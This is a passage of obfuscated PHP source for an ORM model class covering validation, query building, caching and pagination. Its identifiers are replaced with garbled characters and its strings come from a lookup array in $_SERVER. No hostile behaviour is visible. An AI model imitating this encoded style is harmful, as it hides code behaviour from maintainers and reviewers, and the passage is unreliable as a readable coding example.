$ùı¬À„) { $º–Â¯œÆ =& $_SERVER[ïëó©ÒÚ]; if (!empty($this->options[$º–Â¯œÆ[320]])) { $ô¾µÛ±˜ = $this->options[$º–Â¯œÆ[320]]; unset($this->options[$º–Â¯œÆ[320]]); } elseif (!empty($this->_auto)) { $ô¾µÛ±˜ = $this->_auto; } if (isset($ô¾µÛ±˜)) { foreach ($ô¾µÛ±˜ as $‰ß‘Æ˜) { if (empty($‰ß‘Æ˜[2])) { $‰ß‘Æ˜[2] = THINK_MODEL_INSERT; } if ($ùı¬À„ == $‰ß‘Æ˜[2] || $‰ß‘Æ˜[2] == THINK_MODEL_BOTH) { switch (trim($‰ß‘Æ˜[3])) { case $º–Â¯œÆ[321]: case $º–Â¯œÆ[322]: $Ò­í†Îç = isset($‰ß‘Æ˜[4]) ? (array) $‰ß‘Æ˜[4] : array(); if (isset($íã­ØÂ’[$‰ß‘Æ˜[0]])) { array_unshift($Ò­í†Îç, $íã­ØÂ’[$‰ß‘Æ˜[0]]); } if ($º–Â¯œÆ[321] == $‰ß‘Æ˜[3]) { $íã­ØÂ’[$‰ß‘Æ˜[0]] = call_user_func_array($‰ß‘Æ˜[1], $Ò­í†Îç); } else { $íã­ØÂ’[$‰ß‘Æ˜[0]] = call_user_func_array(array(&$this, $‰ß‘Æ˜[1]), $Ò­í†Îç); } break; case $º–Â¯œÆ[273]: $íã­ØÂ’[$‰ß‘Æ˜[0]] = $íã­ØÂ’[$‰ß‘Æ˜[1]]; break; case $º–Â¯œÆ[323]: if ($º–Â¯œÆ[12] === $íã­ØÂ’[$‰ß‘Æ˜[0]]) { unset($íã­ØÂ’[$‰ß‘Æ˜[0]]); } break; case $º–Â¯œÆ[324]: default: $íã­ØÂ’[$‰ß‘Æ˜[0]] = $‰ß‘Æ˜[1]; } if (!1 === $íã­ØÂ’[$‰ß‘Æ˜[0]]) { unset($íã­ØÂ’[$‰ß‘Æ˜[0]]); } } } } return $íã­ØÂ’; } protected function autoValidation($ã…ø³Ä, $¡¿ùâ) { $‡§³ÕóÓ =& $_SERVER[ïëó©ÒÚ]; if (!empty($this->options[$‡§³ÕóÓ[325]])) { $¹äìÍ³Ê = $this->options[$‡§³ÕóÓ[325]]; unset($this->options[$‡§³ÕóÓ[325]]); } elseif (!empty($this->_validate)) { $¹äìÍ³Ê = $this->_validate; } if (isset($¹äìÍ³Ê)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¹äìÍ³Ê as $‚°ìŠô· => $¬şÇãè‰) { if (empty($¬şÇãè‰[5]) || $¬şÇãè‰[5] == THINK_MODEL_BOTH || $¬şÇãè‰[5] == $¡¿ùâ) { if (0 == strpos($¬şÇãè‰[2], $‡§³ÕóÓ[326]) && strpos($¬şÇãè‰[2], $‡§³ÕóÓ[327])) { $¬şÇãè‰[2] = think_lang(substr($¬şÇãè‰[2], 2, -1)); } $¬şÇãè‰[3] = isset($¬şÇãè‰[3]) ? $¬şÇãè‰[3] : THINK_EXISTS_VALIDATE; $¬şÇãè‰[4] = isset($¬şÇãè‰[4]) ? $¬şÇãè‰[4] : $‡§³ÕóÓ[328]; switch ($¬şÇãè‰[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ã…ø³Ä, $¬şÇãè‰)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‡§³ÕóÓ[12] != trim($ã…ø³Ä[$¬şÇãè‰[0]])) { if (!1 === $this->_validationField($ã…ø³Ä, $¬şÇãè‰)) { return !1; } } break; default: if (isset($ã…ø³Ä[$¬şÇãè‰[0]])) { if (!1 === $this->_validationField($ã…ø³Ä, $¬şÇãè‰)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Øî¤¤…, $É¬¦²¾æ) { if (!1 === $this->_validationFieldItem($Øî¤¤…, $É¬¦²¾æ)) { if ($this->patchValidate) { $this->error[$É¬¦²¾æ[0]] = $É¬¦²¾æ[2]; } else { $this->error = $É¬¦²¾æ[2]; return !1; } } return; } protected function _validationFieldItem($€ˆ¼Â¾, $†Âî€‘´) { $àõúçàñ =& $_SERVER[ïëó©ÒÚ]; switch (strtolower(trim($†Âî€‘´[4]))) { case $àõúçàñ[321]: case $àõúçàñ[322]: $üÄˆÉ¯£ = isset($†Âî€‘´[6]) ? (array) $†Âî€‘´[6] : array(); if (is_string($†Âî€‘´[0]) && strpos($†Âî€‘´[0], $àõúçàñ[50])) { $†Âî€‘´[0] = explode($àõúçàñ[50], $†Âî€‘´[0]); } if (is_array($†Âî€‘´[0])) { foreach ($†Âî€‘´[0] as $·©•»õö) { $±Û®’Ÿ¡[$·©•»õö] = $€ˆ¼Â¾[$·©•»õö]; } array_unshift($üÄˆÉ¯£, $±Û®’Ÿ¡); } else { array_unshift($üÄˆÉ¯£, $€ˆ¼Â¾[$†Âî€‘´[0]]); } if ($àõúçàñ[321] == $†Âî€‘´[4]) { return call_user_func_array($†Âî€‘´[1], $üÄˆÉ¯£); } else { return call_user_func_array(array(&$this, $†Âî€‘´[1]), $üÄˆÉ¯£); } case $àõúçàñ[329]: return $€ˆ¼Â¾[$†Âî€‘´[0]] == $€ˆ¼Â¾[$†Âî€‘´[1]]; case $àõúçàñ[330]: if (is_string($†Âî€‘´[0]) && strpos($†Âî€‘´[0], $àõúçàñ[50])) { $†Âî€‘´[0] = explode($àõúçàñ[50], $†Âî€‘´[0]); } $¾øûö´ë = array(); if (is_array($†Âî€‘´[0])) { foreach ($†Âî€‘´[0] as $·©•»õö) { $¾øûö´ë[$·©•»õö] = $€ˆ¼Â¾[$·©•»õö]; } } else { $¾øûö´ë[$†Âî€‘´[0]] = $€ˆ¼Â¾[$†Âî€‘´[0]]; } if (!empty($€ˆ¼Â¾[$this->getPk()])) { $¾øûö´ë[$this->getPk()] = array($àõúçàñ[331], $€ˆ¼Â¾[$this->getPk()]); } if ($this->where($¾øûö´ë)->find()) { return !1; } return !0; default: return $this->check($€ˆ¼Â¾[$†Âî€‘´[0]], $†Âî€‘´[1], $†Âî€‘´[4]); } } public function check($¤æ­û÷³, $¼ã£­¾ú, $ìàÛÕÉî = "\x72\145\x67\145\x78") { $‹›—‹ËÌ =& $_SERVER[ïëó©ÒÚ]; $ìàÛÕÉî = strtolower(trim($ìàÛÕÉî)); switch ($ìàÛÕÉî) { case $‹›—‹ËÌ[7]: case $‹›—‹ËÌ[332]: $Èğ„ç„Ó = is_array($¼ã£­¾ú) ? $¼ã£­¾ú : explode($‹›—‹ËÌ[50], $¼ã£­¾ú); return $ìàÛÕÉî == $‹›—‹ËÌ[7] ? in_array($¤æ­û÷³, $Èğ„ç„Ó) : !in_array($¤æ­û÷³, $Èğ„ç„Ó); case $‹›—‹ËÌ[333]: case $‹›—‹ËÌ[334]: if (is_array($¼ã£­¾ú)) { $ˆ«®óÂÚ = $¼ã£­¾ú[0]; $‘¡‘È×é = $¼ã£­¾ú[1]; } else { list($ˆ«®óÂÚ, $‘¡‘È×é) = explode($‹›—‹ËÌ[50], $¼ã£­¾ú); } return $ìàÛÕÉî == $‹›—‹ËÌ[333] ? $¤æ­û÷³ >= $ˆ«®óÂÚ && $¤æ­û÷³ <= $‘¡‘È×é : $¤æ­û÷³ < $ˆ«®óÂÚ || $¤æ­û÷³ > $‘¡‘È×é; case $‹›—‹ËÌ[335]: case $‹›—‹ËÌ[336]: return $ìàÛÕÉî == $‹›—‹ËÌ[335] ? $¤æ­û÷³ == $¼ã£­¾ú : $¤æ­û÷³ != $¼ã£­¾ú; case $‹›—‹ËÌ[337]: $¯†²Í“ = mb_strlen($¤æ­û÷³, $‹›—‹ËÌ[338]); if (strpos($¼ã£­¾ú, $‹›—‹ËÌ[50])) { list($ˆ«®óÂÚ, $‘¡‘È×é) = explode($‹›—‹ËÌ[50], $¼ã£­¾ú); return $¯†²Í“ >= $ˆ«®óÂÚ && $¯†²Í“ <= $‘¡‘È×é; } else { return $¯†²Í“ == $¼ã£­¾ú; } case $‹›—‹ËÌ[339]: list($‘çø“é, $—ìòÌô¯) = explode($‹›—‹ËÌ[50], $¼ã£­¾ú); if (!is_numeric($‘çø“é)) { $‘çø“é = strtotime($‘çø“é); } if (!is_numeric($—ìòÌô¯)) { $—ìòÌô¯ = strtotime($—ìòÌô¯); } return NOW_TIME >= $‘çø“é && NOW_TIME <= $—ìòÌô¯; case $‹›—‹ËÌ[340]: return in_array(get_client_ip(), explode($‹›—‹ËÌ[50], $¼ã£­¾ú)); case $‹›—‹ËÌ[341]: return !in_array(get_client_ip(), explode($‹›—‹ËÌ[50], $¼ã£­¾ú)); case $‹›—‹ËÌ[328]: default: return $this->regex($¤æ­û÷³, $¼ã£­¾ú); } } public function query($™êËÏ¶Ë, $×ğ×±¡ç = false) { $çñÓ¼…½ =& $_SERVER[ïëó©ÒÚ]; if (!is_bool($×ğ×±¡ç) && !is_array($×ğ×±¡ç)) { $×ğ×±¡ç = func_get_args(); array_shift($×ğ×±¡ç); } $™êËÏ¶Ë = str_replace(array($çñÓ¼…½[231], $çñÓ¼…½[342]), $çñÓ¼…½[53], $™êËÏ¶Ë); $™êËÏ¶Ë = $this->parseSql($™êËÏ¶Ë, $×ğ×±¡ç); return $this->db->query($™êËÏ¶Ë); } public function execute($¤Ğ–Ïóì, $Ùî®™Õ = false) { if (!is_bool($Ùî®™Õ) && !is_array($Ùî®™Õ)) { $Ùî®™Õ = func_get_args(); array_shift($Ùî®™Õ); } $¤Ğ–Ïóì = $this->parseSql($¤Ğ–Ïóì, $Ùî®™Õ); return $this->db->execute($¤Ğ–Ïóì); } protected function parseSql($â‚Ò‡š, $Òû­ê’Ÿ) { $±Õø„Ã€ =& $_SERVER[ïëó©ÒÚ]; if (!0 === $Òû­ê’Ÿ) { $ûÃ†ƒ½¤ = $this->_parseOptions(); $â‚Ò‡š = $this->db->parseSql($â‚Ò‡š, $ûÃ†ƒ½¤); } elseif (is_array($Òû­ê’Ÿ)) { $Òû­ê’Ÿ = array_map(array($this->db, $±Õø„Ã€[343]), $Òû­ê’Ÿ); $â‚Ò‡š = vsprintf($â‚Ò‡š, $Òû­ê’Ÿ); } else { $â‚Ò‡š = strtr($â‚Ò‡š, array($±Õø„Ã€[344] => $this->getTableName(), $±Õø„Ã€[345] => think_config($±Õø„Ã€[244]))); } $this->db->setModel($this->name); return $â‚Ò‡š; } public function db($àÅ§Å¸ = '', $áÀ‡…Ì÷ = '', $Í•à»íë = array()) { $ğõîç¨Ã =& $_SERVER[ïëó©ÒÚ]; if ($ğõîç¨Ã[12] === $àÅ§Å¸ && $this->db) { return $this->db; } static $ı¡Š†¦ = array(); static $‘Üúñ = array(); if (!isset($‘Üúñ[$àÅ§Å¸]) || isset($‘Üúñ[$àÅ§Å¸]) && $áÀ‡…Ì÷ && $ı¡Š†¦[$àÅ§Å¸] != $áÀ‡…Ì÷) { if (!empty($áÀ‡…Ì÷) && is_string($áÀ‡…Ì÷) && !1 === strpos($áÀ‡…Ì÷, $ğõîç¨Ã[8])) { $áÀ‡…Ì÷ = think_config($áÀ‡…Ì÷); } $àÅ§Å¸ = think_guid($áÀ‡…Ì÷); $‘Üúñ[$àÅ§Å¸] = Db::getInstance($áÀ‡…Ì÷); } elseif (NULL === $áÀ‡…Ì÷) { $‘Üúñ[$àÅ§Å¸]->close(); unset($‘Üúñ[$àÅ§Å¸]); return; } if (!empty($Í•à»íë)) { if (is_string($Í•à»íë)) { parse_str($Í•à»íë, $Í•à»íë); } foreach ($Í•à»íë as $úÁÀÂİ => $ñº£²…‚) { $this->setProperty($úÁÀÂİ, $ñº£²…‚); } } $ı¡Š†¦[$àÅ§Å¸] = $áÀ‡…Ì÷; $this->db = $‘Üúñ[$àÅ§Å¸]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $›¡‚¦ßš = get_class($this); if ($›¡‚¦ßš == $_SERVER[ïëó©ÒÚ][346]) { return $this->name; } $this->name = substr($›¡‚¦ßš, 0, -5); } return $this->name; } public function getTableName() { $½Û½ê¾ =& $_SERVER[ïëó©ÒÚ]; if (empty($this->trueTableName)) { $…ÔÀÌóÏ = !empty($this->tablePrefix) ? $this->tablePrefix : $½Û½ê¾[12]; if (!empty($this->tableName)) { $…ÔÀÌóÏ .= $this->tableName; } else { $…ÔÀÌóÏ .= think_parse_name($this->name); } $this->trueTableName = strtolower($…ÔÀÌóÏ); } return (!empty($this->dbName) ? $this->dbName . $½Û½ê¾[10] : $½Û½ê¾[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¢ôƒŒÈ =& $_SERVER[ïëó©ÒÚ]; return isset($this->fields[$¢ôƒŒÈ[251]]) ? $this->fields[$¢ôƒŒÈ[251]] : $this->pk; } public function getDbFields() { $áë¬¡¡» =& $_SERVER[ïëó©ÒÚ]; if (isset($this->options[$áë¬¡¡»[279]])) { $ÎÅªÃş = $this->db->getFields($this->options[$áë¬¡¡»[279]]); return $ÎÅªÃş ? array_keys($ÎÅªÃş) : !1; } if ($this->fields) { $ÎÅªÃş = $this->fields; unset($ÎÅªÃş[$áë¬¡¡»[250]], $ÎÅªÃş[$áë¬¡¡»[251]], $ÎÅªÃş[$áë¬¡¡»[252]], $ÎÅªÃş[$áë¬¡¡»[249]]); return $ÎÅªÃş; } return !1; } public function data($œçØ£‡Ç = '') { $é« Æ–› =& $_SERVER[ïëó©ÒÚ]; if ($é« Æ–›[12] === $œçØ£‡Ç && !empty($this->data)) { return $this->data; } if (is_object($œçØ£‡Ç)) { $œçØ£‡Ç = get_object_vars($œçØ£‡Ç); } elseif (is_string($œçØ£‡Ç)) { parse_str($œçØ£‡Ç, $œçØ£‡Ç); } elseif (!is_array($œçØ£‡Ç)) { think_exception(think_lang($é« Æ–›[271])); } $this->data = $œçØ£‡Ç; return $this; } public function join($ı®úô„¼) { $©êà³¢ =& $_SERVER[ïëó©ÒÚ]; if (is_array($ı®úô„¼)) { $this->options[$©êà³¢[282]] = $ı®úô„¼; } elseif (!empty($ı®úô„¼)) { $this->options[$©êà³¢[282]][] = $ı®úô„¼; } return $this; } public function union($‹ç¸¿Ô, $í¿Ûİãà = false) { $˜¥ú¢õì =& $_SERVER[ïëó©ÒÚ]; if (empty($‹ç¸¿Ô)) { return $this; } if ($í¿Ûİãà) { $this->options[$˜¥ú¢õì[347]][$˜¥ú¢õì[348]] = !0; } if (is_object($‹ç¸¿Ô)) { $‹ç¸¿Ô = get_object_vars($‹ç¸¿Ô); } if (is_string($‹ç¸¿Ô)) { $§Ø“ˆ¾Ù = $‹ç¸¿Ô; } elseif (is_array($‹ç¸¿Ô)) { if (isset($‹ç¸¿Ô[0])) { $this->options[$˜¥ú¢õì[347]] = array_merge($this->options[$˜¥ú¢õì[347]], $‹ç¸¿Ô); return $this; } else { $§Ø“ˆ¾Ù = $‹ç¸¿Ô; } } else { think_exception(think_lang($˜¥ú¢õì[271])); } $this->options[$˜¥ú¢õì[347]][] = $§Ø“ˆ¾Ù; return $this; } public function cache($óšã§’ó = true, $³ÔúÈ = null, $Ö”Æ…®Å = '') { $ùÚæÉÆ =& $_SERVER[ïëó©ÒÚ]; if (!1 !== $óšã§’ó) { $this->options[$ùÚæÉÆ[349]] = array($ùÚæÉÆ[94] => $óšã§’ó, $ùÚæÉÆ[339] => $³ÔúÈ, $ùÚæÉÆ[33] => $Ö”Æ…®Å); } return $this; } public function field($¨ÁïÔÚÓ, $ÔÃç•ô§ = false) { $Òáß­ñ =& $_SERVER[ïëó©ÒÚ]; if (!0 === $¨ÁïÔÚÓ) { $ı¶ôÁ‹Î = $this->getDbFields(); $¨ÁïÔÚÓ = $ı¶ôÁ‹Î ? $ı¶ôÁ‹Î : $Òáß­ñ[188]; } elseif ($ÔÃç•ô§) { if (is_string($¨ÁïÔÚÓ)) { $¨ÁïÔÚÓ = explode($Òáß­ñ[50], $¨ÁïÔÚÓ); } $ı¶ôÁ‹Î = $this->getDbFields(); $¨ÁïÔÚÓ = $ı¶ôÁ‹Î ? array_diff($ı¶ôÁ‹Î, $¨ÁïÔÚÓ) : $¨ÁïÔÚÓ; } $this->options[$Òáß­ñ[273]] = $¨ÁïÔÚÓ; return $this; } public function scope($—€½å¤Š = '', $°à€¹Ğ  = NULL) { $“Ñ¾Æê =& $_SERVER[ïëó©ÒÚ]; if ($“Ñ¾Æê[12] === $—€½å¤Š) { if (isset($this->_scope[$“Ñ¾Æê[37]])) { $ú¶Ï¬åÇ = $this->_scope[$“Ñ¾Æê[37]]; } else { return $this; } } elseif (is_string($—€½å¤Š)) { $¨—“ÚŸ§ = explode($“Ñ¾Æê[50], $—€½å¤Š); $ú¶Ï¬åÇ = array(); foreach ($¨—“ÚŸ§ as $³ı»å¾‰) { if (!isset($this->_scope[$³ı»å¾‰])) { continue; } $ú¶Ï¬åÇ = array_merge($ú¶Ï¬åÇ, $this->_scope[$³ı»å¾‰]); } if (!empty($°à€¹Ğ ) && is_array($°à€¹Ğ )) { $ú¶Ï¬åÇ = array_merge($ú¶Ï¬åÇ, $°à€¹Ğ ); } } elseif (is_array($—€½å¤Š)) { $ú¶Ï¬åÇ = $—€½å¤Š; } if (is_array($ú¶Ï¬åÇ) && !empty($ú¶Ï¬åÇ)) { $this->options = array_merge($this->options, array_change_key_case($ú¶Ï¬åÇ)); } return $this; } public function where($¹ôƒÃ¹¬, $ş²ëƒ = null) { $˜Î¶«­ =& $_SERVER[ïëó©ÒÚ]; if (!is_null($ş²ëƒ) && is_string($¹ôƒÃ¹¬)) { if (!is_array($ş²ëƒ)) { $ş²ëƒ = func_get_args(); array_shift($ş²ëƒ); } $ş²ëƒ = array_map(array($this->db, $˜Î¶«­[343]), $ş²ëƒ); $¹ôƒÃ¹¬ = vsprintf($¹ôƒÃ¹¬, $ş²ëƒ); } elseif (is_object($¹ôƒÃ¹¬)) { $¹ôƒÃ¹¬ = get_object_vars($¹ôƒÃ¹¬); } elseif (is_array($¹ôƒÃ¹¬)) { foreach ($¹ôƒÃ¹¬ as $ëü¸è…Ù => $¦¢Ç¨ìÏ) { if ((is_numeric($ëü¸è…Ù) || !$ëü¸è…Ù) && is_string($¦¢Ç¨ìÏ)) { if (strpos($¦¢Ç¨ìÏ, $˜Î¶«­[350]) === 0) { continue; } think_trace($˜Î¶«­[351], $˜Î¶«­[12], $˜Î¶«­[49]); die; } } } if (is_string($¹ôƒÃ¹¬) && $˜Î¶«­[12] != $¹ôƒÃ¹¬) { $œô¬ØŸ‘ = array(); $œô¬ØŸ‘[$˜Î¶«­[352]] = $¹ôƒÃ¹¬; $¹ôƒÃ¹¬ = $œô¬ØŸ‘; } if (isset($this->options[$˜Î¶«­[275]])) { $this->options[$˜Î¶«­[275]] = array_merge($this->options[$˜Î¶«­[275]], $¹ôƒÃ¹¬); } else { $this->options[$˜Î¶«­[275]] = $¹ôƒÃ¹¬; } return $this; } public function limit($³³×Õ, $«ÊòôİŸ = null) { $éå³ŠñÆ =& $_SERVER[ïëó©ÒÚ]; $this->options[$éå³ŠñÆ[292]] = is_null($«ÊòôİŸ) ? $³³×Õ : $³³×Õ . $éå³ŠñÆ[50] . $«ÊòôİŸ; return $this; } public function page($€ƒ—‚„‡, $À÷æİ¯š = null) { $´ùÓôÎú =& $_SERVER[ïëó©ÒÚ]; $this->options[$´ùÓôÎú[353]] = is_null($À÷æİ¯š) ? $€ƒ—‚„‡ : $€ƒ—‚„‡ . $´ùÓôÎú[50] . $À÷æİ¯š; return $this; } public function comment($¾±‰ê­) { $this->options[$_SERVER[ïëó©ÒÚ][354]] = $¾±‰ê­; return $this; } public function setProperty($šÔ­²ÃÏ, $ÑÑÇè‡œ) { if (property_exists($this, $šÔ­²ÃÏ)) { $this->{$šÔ­²ÃÏ} = $ÑÑÇè‡œ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\151\155\x65", "\x74\151\155\x65", "\151\x6e\x73\x65\162\x74\54\165\160\144\x61\x74\x65", "\x66\x75\156\x63\164\151\157\x6e"), array("\x63\x72\145\x61\164\145\124\x69\155\145", "\164\x69\x6d\145", "\151\156\163\145\162\164", "\146\x75\x6e\143\x74\151\157\156")); public function setDataAuto($İ¿Œœä¿) { $this->dataAuto = $İ¿Œœä¿; } public function __construct($Ûû´½¹ = '', $èË×Ì‡» = '', $é¶÷‰³˜ = '') { parent::__construct($Ûû´½¹, $èË×Ì‡», $é¶÷‰³˜); } protected $tableMeta = array(); protected function _beforeInsert(&$ß”ïÔÑ¦, $–„ÇÜ™¥) { $Á®Å†° =& $_SERVER[ïëó©ÒÚ]; if (!$this->checkDataAutoHas($Á®Å†°[355])) { return; } $this->dataBeforeFilter($ß”ïÔÑ¦, $Á®Å†°[355]); } protected function _beforeUpdate(&$µö—ºİÔ, $‡âËµ”È) { $âìñã²™ =& $_SERVER[ïëó©ÒÚ]; if (!$this->checkDataAutoHas($âìñã²™[356])) { return; } $this->dataBeforeFilter($µö—ºİÔ, $âìñã²™[356]); } protected function _afterSelect(&$Æ×øÂî“, $½ôù¸Ë) { if (!is_array($Æ×øÂî“)) { return; } if (!$this->checkDataAutoHas($_SERVER[ïëó©ÒÚ][357])) { return; } foreach ($Æ×øÂî“ as &$ÈÖ¤˜³) { $this->dataAfterFilter($ÈÖ¤˜³); } unset($ÈÖ¤˜³); } protected function _afterFind(&$’³ÂÕÆà, $’ˆ¬ñÁ) { if (!is_array($’³ÂÕÆà)) { return; } if (!$this->checkDataAutoHas($_SERVER[ïëó©ÒÚ][357])) { return; } $this->dataAfterFilter($’³ÂÕÆà); } public static function textEncode($ùÅçĞ¨À) { if (!$ùÅçĞ¨À) { return $ùÅçĞ¨À; } $¥—×áû = json_encode($ùÅçĞ¨À); $¥—×áû = preg_replace_callback($_SERVER[ïëó©ÒÚ][358], function ($¿÷’Ïä¨) { return addslashes($¿÷’Ïä¨[0]); }, $¥—×áû); return json_decode($¥—×áû); } public static function textDecode($«€˜î“Î) { $õ•ÆÑ¢ß =& $_SERVER[ïëó©ÒÚ]; $ÁºÀ‚”” = json_encode($«€˜î“Î); $ÁºÀ‚”” = preg_replace_callback($õ•ÆÑ¢ß[359], function ($˜ÎŞ—À) { return $_SERVER[ïëó©ÒÚ][97]; }, $ÁºÀ‚””); return json_decode($ÁºÀ‚””); } public function setAutoIncrement($À’Áåñ») { $Ùœ°»¬ó = array($this->getPk() => $À’Áåñ»); $îÀ‹Şµ´ = $this->data($Ùœ°»¬ó)->add(); if ($îÀ‹Şµ´) { $this->delete($îÀ‹Şµ´); } } public function getAutoIncrement() { $àÀ‚ÌõÙ = $this->getTableName(); $şø¯¬´â = $this->max($this->getPk()); $’€û¢íô = $this->query("\163\x68\x6f\x77\x20\164\141\142\x6c\x65\40\163\x74\141\164\x75\163\x20\167\x68\x65\x72\x65\40\x4e\x61\155\x65\75\47{$àÀ‚ÌõÙ}\47"); $éÇ…µù = $’€û¢íô[0][$_SERVER[ïëó©ÒÚ][360]]; $ÔğëèÑí = max($şø¯¬´â, $éÇ…µù); return $ÔğëèÑí; } protected function _callBefore($Õ¯ûÙ™Ñ, $Æ¯ùÒ¶ş) { return $this->cacheCallCheck($Õ¯ûÙ™Ñ, $Æ¯ùÒ¶ş, !1); } protected function _callAfter($šÕÈ“ª, $‡¦¡ˆÄ) { return $this->cacheCallCheck($šÕÈ“ª, $‡¦¡ˆÄ, !0); } protected function cacheFunctionAlias($‘«Öâ«ˆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‹¶ŞæÅö, $’Ùí‹¨Ü, $õ¼±ƒ· = false) { $ß¬„›¤† = $this->cacheFunctionAlias($’Ùí‹¨Ü); if (!$ß¬„›¤†) { return; } foreach ($ß¬„›¤† as $Ã™Àëï¿ => $´ºÂÙ±Ğ) { $Ë–¡ò¢ = $´ºÂÙ±Ğ[0]; $ µÈ¾ = explode($_SERVER[ïëó©ÒÚ][50], $´ºÂÙ±Ğ[1]); if ($‹¶ŞæÅö == $Ã™Àëï¿) { return $this->cacheFunctionGet($Ã™Àëï¿, $Ë–¡ò¢); } if ($õ¼±ƒ· && in_array($‹¶ŞæÅö, $ µÈ¾)) { $this->cacheFunctionClear($Ã™Àëï¿, $Ë–¡ò¢); } } } public function cacheFunctionGet($âÈ½ÏÁà, $¯“üÁ—Î) { $¯¼´ÃËŒ = $this->cacheKeyMake($âÈ½ÏÁà, $¯“üÁ—Î); $œÁ×ñ¯Ó = Cache::get($¯¼´ÃËŒ); if (!is_array($œÁ×ñ¯Ó)) { $œÁ×ñ¯Ó = call_user_func_array(array($this, $âÈ½ÏÁà), array($¯“üÁ—Î, !0)); Cache::set($¯¼´ÃËŒ, $œÁ×ñ¯Ó); } return $œÁ×ñ¯Ó; } public function cacheFunctionClear($¥ƒœµÂˆ, $äÕôãş¨) { $îäÄ²±± = $äÕôãş¨; if (!is_array($äÕôãş¨)) { $îäÄ²±± = array($äÕôãş¨); } foreach ($îäÄ²±± as $½Óšöû‹) { $Ü‘¨ê¯ = $this->cacheKeyMake($¥ƒœµÂˆ, $½Óšöû‹); Cache::remove($Ü‘¨ê¯); } } private function cacheKeyMake($ÃŸ¸ãã´, $×ÊÃú†ı) { $éÏ¹Ñˆñ =& $_SERVER[ïëó©ÒÚ]; return get_class($this) . $éÏ¹Ñˆñ[11] . $ÃŸ¸ãã´ . $éÏ¹Ñˆñ[361] . $×ÊÃú†ı; } protected function selectPageReset() { $…ÕÕƒÀ” =& $_SERVER[ïëó©ÒÚ]; if (isset($GLOBALS[$…ÕÕƒÀ”[362]])) { return; } $GLOBALS[$…ÕÕƒÀ”[362]] = isset($GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[363]]) ? $GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[363]] : !1; $GLOBALS[$…ÕÕƒÀ”[364]] = isset($GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[353]]) ? $GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[353]] : !1; $GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[363]] = !1; $GLOBALS[$…ÕÕƒÀ”[7]][$…ÕÕƒÀ”[353]] = !1; } protected function selectPageRestore() { $Õ•àíç =& $_SERVER[ïëó©ÒÚ]; if (!isset($GLOBALS[$Õ•àíç[362]])) { return; } $GLOBALS[$Õ•àíç[7]][$Õ•àíç[363]] = $GLOBALS[$Õ•àíç[362]]; $GLOBALS[$Õ•àíç[7]][$Õ•àíç[353]] = $GLOBALS[$Õ•àíç[364]]; if ($GLOBALS[$Õ•àíç[7]][$Õ•àíç[363]] === !1) { unset($GLOBALS[$Õ•àíç[7]][$Õ•àíç[363]]); } if ($GLOBALS[$Õ•àíç[7]][$Õ•àíç[353]] === !1) { unset($GLOBALS[$Õ•àíç[7]][$Õ•àíç[353]]); } unset($GLOBALS[$Õ•àíç[362]]); unset($GLOBALS[$Õ•àíç[364]]); } protected function selectPage($²ÄÖˆ¦ = 200, $´­åê = 1) { $²‡¯Áû =& $_SERVER[ïëó©ÒÚ]; global $in; $›³Ûå’ı = $this->optionsValue(); $µ„´×¸æ = 50000; $²ÄÖˆ¦ = isset($in[$²‡¯Áû[363]]) && $in[$²‡¯Áû[363]] ? $in[$²‡¯Áû[363]] : $²ÄÖˆ¦; if ($²ÄÖˆ¦ === -1) { $in[$²‡¯Áû[363]] = !1; $µ„´×¸æ = 100000000; $²ÄÖˆ¦ = $µ„´×¸æ; } $Èïì”©ª = $›³Ûå’ı; $Èïì”©ª[$²‡¯Áû[365]] = array(); $²ÄÖˆ¦ = intval($²ÄÖˆ¦); $²ÄÖˆ¦ = $²ÄÖˆ¦ <= 5 ? 5 : ($²ÄÖˆ¦ >= $µ„´×¸æ ? $µ„´×¸æ : $²ÄÖˆ¦); $´­åê = intval(isset($in[$²‡¯Áû[353]]) && $in[$²‡¯Áû[353]] ? $in[$²‡¯Áû[353]] : $´­åê); $´­åê = $´­åê <= 1 ? 1 : $´­åê; $ãŠÈ‚Ü¯ = array(); $­ü¶Ìé” = 1; if ($´­åê == 1 && $­ü¶Ìé”) { $this->optionsValue($›³Ûå’ı); $ãŠÈ‚Ü¯ = $this->page($´­åê, $²ÄÖˆ¦)->select(); $…™ƒÉ¡æ = is_array($ãŠÈ‚Ü¯) ? count($ãŠÈ‚Ü¯) : 0; if ($…™ƒÉ¡æ < $²ÄÖˆ¦) { $³å˜ŸÁù = 1; } else { $this->optionsValue($Èïì”©ª); $…™ƒÉ¡æ = intval($this->count()); $³å˜ŸÁù = ceil($…™ƒÉ¡æ / $²ÄÖˆ¦); } } else { $this->optionsValue($Èïì”©ª); $…™ƒÉ¡æ = intval($this->count()); $³å˜ŸÁù = ceil($…™ƒÉ¡æ / $²ÄÖˆ¦); $´­åê = $´­åê >= $³å˜ŸÁù ? $³å˜ŸÁù : $´­åê; $this->optionsValue($›³Ûå’ı); $ãŠÈ‚Ü¯ = $this->page($´­åê, $²ÄÖˆ¦)->select(); } if (!is_array($ãŠÈ‚Ü¯)) { $ãŠÈ‚Ü¯ = array(); } if ($³å˜ŸÁù == 1) { $…™ƒÉ¡æ = count($ãŠÈ‚Ü¯); } $«äÅÁÔ = array($²‡¯Áû[366] => array($²‡¯Áû[367] => $…™ƒÉ¡æ, $²‡¯Áû[363] => 